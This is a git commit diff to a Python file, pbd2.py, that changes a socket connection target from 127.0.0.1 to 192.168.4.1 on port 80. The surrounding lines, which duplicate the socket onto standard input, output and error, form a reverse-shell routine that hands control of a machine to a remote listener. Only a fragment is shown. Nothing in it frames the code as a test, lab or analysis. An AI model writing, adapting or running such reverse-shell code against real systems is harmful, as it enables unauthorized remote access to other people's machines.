410f1d10a7feff76f306c112fd2ba25c44ca5991
stevesanchez29 <31682913+stevesanchez29@users.noreply.github.com>
2021-11-19 06:34:45 -0600

    Update pbd2.py

--- pbd2.py
+++ pbd2.py
@@ -5,7 +5,7 @@ import socket
 def connect():
     try:
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(("127.0.0.1",80)) 
+        s.connect(("192.168.4.1",80)) 
         dup2(s.fileno(),0) 
         dup2(s.fileno(),1) 
         dup2(s.fileno(),2) 
